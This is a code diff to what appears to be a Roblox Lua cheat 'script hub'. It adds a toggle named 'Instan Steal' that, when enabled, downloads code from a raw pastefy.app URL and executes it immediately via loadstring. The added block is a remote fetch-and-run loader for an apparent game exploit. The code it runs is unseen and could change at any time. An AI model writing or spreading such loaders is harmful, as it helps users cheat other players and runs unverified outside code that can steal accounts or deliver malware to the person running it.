@@ -119,6 +119,16 @@ closeButton.MouseButton1Click:Connect(function()
 end)
 
 
+_G.FaDhenAddToggle("🪐Instan Steal", {
+    Name = "🪐Instan Steal",
+    Callback = function(on)
+        if on then
+     loadstring(game:HttpGet("https://pastefy.app/J3oDjwQ5/raw"))()
+    
+        end
+    end
+})
+
 
 _G.FaDhenAddToggle("Chilli Hub", {
     Name = "Chilli Hub",
